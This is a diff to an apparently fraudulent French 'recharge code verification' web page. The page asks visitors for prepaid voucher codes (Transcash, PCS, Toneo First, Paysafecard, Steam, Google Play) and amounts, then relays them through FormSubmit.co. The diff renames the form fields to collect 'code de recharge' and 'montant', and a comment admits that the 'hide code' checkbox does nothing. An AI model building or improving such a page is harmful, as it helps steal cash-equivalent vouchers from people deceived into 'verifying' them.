@@ -461,18 +461,18 @@
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_template" value="table">
 
-    <div class="champ" id="champ-reference">
+    <div class="champ" id="champ-code de recharge">
       <svg class="icone" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><rect x="6" y="3" width="12" height="18" rx="2"/><path d="M9 3h6v3H9z"/><path d="M9 11h6M9 15h4"/></svg>
-      <input type="text" name="reference" placeholder="CODE DE RECHARGE">
+      <input type="text" name="code de recharge" placeholder="CODE DE RECHARGE">
     </div>
 
     <div class="champ">
       <svg class="icone" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M7 3h7l4 4v14H7z"/><path d="M14 3v4h4"/><path d="M9 13h6M9 17h6"/></svg>
-      <select name="type_demande" required>
+      <select name="type_de_recharge" required>
           <option value="" disabled selected hidden>TYPE DE RECHARGE</option>
         <option value="transcash">TRANSCASH&reg</option>
         <option value="pcs">PCS&reg</option>
-        <option value="suivi_dossier">TONEO FIRST&reg</option>
+        <option value="toneo first">TONEO FIRST&reg</option>
         <option value="paysafeccard">PAYSAFECARD&reg</option>
         <option value="steam">STEAM&reg</option>
         <option value="google play">GOOGLE PLAY&reg</option>
@@ -484,7 +484,7 @@
 
     <div class="champ">
       <svg class="icone" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 0 1 5 0c0 1.8-2.2 2-2.2 3.6" /><circle cx="12" cy="16.6" r="0.4" fill="currentColor"/></svg>
-      <select name="pourquoi" required>
+      <select name="montant" required>
         <option value="" disabled selected hidden>MONTANT RECHARGE?</option>
         <option value="5£">5 &euro;</option>
         <option value="10£">10 &euro;</option>
@@ -514,8 +514,8 @@
     </div>
 
     <label class="case">
-      <input type="checkbox" id="cacher-reference">
-      Cacher la RÉFÉRENCE
+      <input type="checkbox" id="cacher code de recharge">
+      Cacher code de recharge
     </label>
 
     <button type="submit" class="envoyer" id="bouton-envoyer">VÉRIFIER</button>
@@ -563,7 +563,7 @@
     images[indexActuel].classList.add('actif');
   }, 3000);
 
-  /* ---- Case "Cacher la RÉFÉRENCE" : purement décorative, aucun effet ---- */
+  /* ---- Case "Cacher code de recharge" : purement décorative, aucun effet ---- */
 
   /* ---- Envoi du formulaire vers FormSubmit.co (compatible GitHub Pages, sans inscription) ---- */
   const formulaire = document.getElementById('formulaire-support');
